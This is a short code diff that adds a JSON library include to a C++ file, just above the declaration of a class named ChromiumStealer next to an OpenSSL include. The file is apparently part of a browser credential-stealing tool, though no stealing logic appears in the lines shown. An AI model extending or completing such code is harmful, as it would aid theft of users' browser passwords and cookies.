@@ -17,6 +17,7 @@
 
 #include <openssl/evp.h>
 
+#include "utils/json/json.hpp"
 using json = nlohmann::json;
 
 class ChromiumStealer {
